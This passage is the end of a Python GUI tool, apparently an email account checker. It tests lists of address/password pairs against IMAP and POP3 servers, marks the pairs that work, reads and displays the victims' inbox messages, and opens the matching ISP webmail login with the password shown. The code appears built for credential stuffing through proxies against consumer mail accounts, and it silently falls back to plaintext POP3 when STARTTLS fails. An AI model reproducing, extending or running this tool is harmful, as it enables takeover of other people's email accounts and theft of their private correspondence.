                            if isinstance(from_, bytes):
                                from_ = from_.decode(encoding if encoding else 'utf-8')
                            
                            date = msg.get("Date", "Unknown")
                            
                            # Add to email list
                            self.email_tree.insert("", "end", values=(from_, subject, date), tags=(num,))
                    
                    mail.logout()
                    self.current_email_client = ("IMAP", email, password, server)
                    self.log(f"Connected to {email} via IMAP")
                else:
                    self.log(f"Failed to connect to {email} via IMAP")
            
            else:  # POP3
                # Connect to POP3
                if server == 'pop.gmail.com' or server.endswith('gmail.com'):
                    mail = poplib.POP3_SSL(server, 995)
                else:
                    mail = poplib.POP3(server, 110)
                    try:
                        mail.stls()
                    except:
                        pass
                
                mail.user(email)
                mail.pass_(password)
                
                # Get email count
                num_messages = len(mail.list()[1])
                
                # Clear email list
                self.email_tree.delete(*self.email_tree.get_children())
                
                # Get first 10 emails
                for i in range(1, min(11, num_messages + 1)):
                    response, lines, octets = mail.retr(i)
                    msg_content = b'\r\n'.join(lines).decode('utf-8', errors='ignore')
                    msg = email.message_from_string(msg_content)
                    
                    # Get email details
                    subject, encoding = decode_header(msg["Subject"])[0] if msg["Subject"] else ("No Subject", None)
                    if isinstance(subject, bytes):
                        subject = subject.decode(encoding if encoding else 'utf-8')
                    
                    from_, encoding = decode_header(msg.get("From"))[0] if msg.get("From") else ("Unknown", None)
                    if isinstance(from_, bytes):
                        from_ = from_.decode(encoding if encoding else 'utf-8')
                    
                    date = msg.get("Date", "Unknown")
                    
                    # Add to email list
                    self.email_tree.insert("", "end", values=(from_, subject, date), tags=(i,))
                
                mail.quit()
                self.current_email_client = ("POP3", email, password, server)
                self.log(f"Connected to {email} via POP3")
                
        except Exception as e:
            self.log(f"Error connecting to email client: {str(e)}")
            messagebox.showerror("Error", f"Failed to connect: {str(e)}")
    
    def on_email_select(self, event):
        item = self.email_tree.selection()[0]
        email_id = self.email_tree.item(item, "tags")[0]
        
        if self.current_email_client:
            protocol, email, password, server = self.current_email_client
            
            try:
                if protocol == "IMAP":
                    # Connect to IMAP
                    context = ssl.create_default_context()
                    mail = imaplib.IMAP4_SSL(server, 993, ssl_context=context)
                    mail.timeout = 30
                    mail.login(email, password)
                    mail.select('inbox')
                    
                    # Fetch the email
                    status, data = mail.fetch(email_id, '(RFC822)')
                    
                    if status == 'OK':
                        msg = email.message_from_bytes(data[0][1])
                        self.display_email(msg)
                    
                    mail.logout()
                
                else:  # POP3
                    # Connect to POP3
                    if server == 'pop.gmail.com' or server.endswith('gmail.com'):
                        mail = poplib.POP3_SSL(server, 995)
                    else:
                        mail = poplib.POP3(server, 110)
                        try:
                            mail.stls()
                        except:
                            pass
                    
                    mail.user(email)
                    mail.pass_(password)
                    
                    # Fetch the email
                    response, lines, octets = mail.retr(int(email_id))
                    msg_content = b'\r\n'.join(lines).decode('utf-8', errors='ignore')
                    msg = email.message_from_string(msg_content)
                    self.display_email(msg)
                    
                    mail.quit()
                    
            except Exception as e:
                self.log(f"Error fetching email: {str(e)}")
    
    def display_email(self, msg):
        # Clear email content
        self.email_content.delete(1.0, tk.END)
        
        # Get email details
        subject, encoding = decode_header(msg["Subject"])[0] if msg["Subject"] else ("No Subject", None)
        if isinstance(subject, bytes):
            subject = subject.decode(encoding if encoding else 'utf-8')
        
        from_, encoding = decode_header(msg.get("From"))[0] if msg.get("From") else ("Unknown", None)
        if isinstance(from_, bytes):
            from_ = from_.decode(encoding if encoding else 'utf-8')
        
        date = msg.get("Date", "Unknown")
        to = msg.get("To", "")
        
        # Display email headers
        self.email_content.insert(tk.END, f"From: {from_}\n")
        self.email_content.insert(tk.END, f"To: {to}\n")
        self.email_content.insert(tk.END, f"Date: {date}\n")
        self.email_content.insert(tk.END, f"Subject: {subject}\n")
        self.email_content.insert(tk.END, "\n" + "="*50 + "\n\n")
        
        # Display email body
        if msg.is_multipart():
            for part in msg.walk():
                content_type = part.get_content_type()
                content_disposition = str(part.get("Content-Disposition"))
                
                if content_type == "text/plain" and "attachment" not in content_disposition:
                    try:
                        body = part.get_payload(decode=True).decode()
                        self.email_content.insert(tk.END, body)
                    except:
                        pass
                elif content_type == "text/html" and "attachment" not in content_disposition:
                    try:
                        body = part.get_payload(decode=True).decode()
                        # Simple HTML to text conversion
                        body = re.sub('<[^<]+?>', '', body)
                        self.email_content.insert(tk.END, body)
                    except:
                        pass
        else:
            try:
                body = msg.get_payload(decode=True).decode()
                self.email_content.insert(tk.END, body)
            except:
                pass
    
    def process_queue(self):
        try:
            while True:
                task_type, data = self.queue.get_nowait()
                
                if task_type == 'result':
                    self.results.append(data)
                    
                    # Insert into treeview
                    item_id = self.tree.insert("", "end", values=(
                        data['address'], 
                        data['password'], 
                        data['protocol'],
                        data['request'], 
                        data['found'],
                        "Login" if data['valid'] else "N/A"
                    ))
                    
                    # Color code results
                    if data['valid']:
                        self.tree.set(item_id, "actions", "Login")
                
                elif task_type == 'progress':
                    self.progress_var.set(data)
                
                elif task_type == 'status':
                    self.status_label.config(text=data)
                
                elif task_type == 'log':
                    self.log(data)
                    
        except queue.Empty:
            pass
        
        # Schedule next queue processing
        self.root.after(100, self.process_queue)
    
    def log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_area.insert(tk.END, f"[{timestamp}] {message}\n")
        self.log_area.see(tk.END)
    
    def on_tree_double_click(self, event):
        item = self.tree.selection()[0]
        col = self.tree.identify_column(event.x)
        
        if col == "#6":  # Actions column
            address = self.tree.item(item, "values")[0]
            password = self.tree.item(item, "values")[1]
            
            if self.tree.item(item, "values")[5] == "Login":
                self.login_to_email(address, password)
    
    def login_to_email(self, address, password):
        domain = address.split('@')[-1] if '@' in address else ''
        
        # Map domains to webmail URLs
        webmail_urls = {
            'charter.net': 'https://www.spectrum.net/login',
            'comcast.net': 'https://login.xfinity.com/login',
            'optonline.net': 'https://www.optimum.net/login',
            'optimum.net': 'https://www.optimum.net/login',
            'earthlink.net': 'https://www.earthlink.net/login',
            'roadrunner.com': 'https://webmail.roadrunner.com',
            'twc.com': 'https://www.spectrum.net/login',
            'rr.com': 'https://webmail.rr.com',
            'nc.rr.com': 'https://webmail.rr.com',
            'triad.rr.com': 'https://webmail.rr.com',
            'nycap.rr.com': 'https://webmail.rr.com',
            'tampabay.rr.com': 'https://webmail.rr.com',
            'carolina.rr.com': 'https://webmail.rr.com',
            'rochester.rr.com': 'https://webmail.rr.com',
            'suddenlink.net': 'https://webmail.suddenlink.net',
            'windstream.net': 'https://webmail.windstream.net',
            'atlanticbb.net': 'https://webmail.atlanticbb.net',
            'ptd.net': 'https://webmail.ptd.net',
            'zoominternet.net': 'https://webmail.zoominternet.net',
            'rcn.com': 'https://webmail.rcn.com',
            'adelphia.net': 'https://webmail.adelphia.net',
            'peoplepc.com': 'https://webmail.peoplepc.com',
            'centurylink.net': 'https://webmail.centurylink.net',
            'gmail.com': 'https://mail.google.com',
            'yahoo.com': 'https://mail.yahoo.com',
            'outlook.com': 'https://outlook.live.com',
            'hotmail.com': 'https://outlook.live.com',
            'aol.com': 'https://mail.aol.com'
        }
        
        if domain in webmail_urls:
            url = webmail_urls[domain]
            self.log(f"Opening webmail for {address}: {url}")
            webbrowser.open(url)
            
            # In a real application, you would auto-fill credentials
            # This is just a demonstration
            messagebox.showinfo("Login", f"Please manually login to {domain} with:\nEmail: {address}\nPassword: {password}")
        else:
            self.log(f"No webmail URL known for {domain}")
            messagebox.showinfo("Login", f"Please manually login to your email client with:\nEmail: {address}\nPassword: {password}")

def main():
    # Install socks module if not available
    try:
        import socks
    except ImportError:
        print("Please install PySocks: pip install PySocks")
        return
    
    root = tk.Tk()
    app = EmailChecker(root)
    root.mainloop()

if __name__ == "__main__":
    main()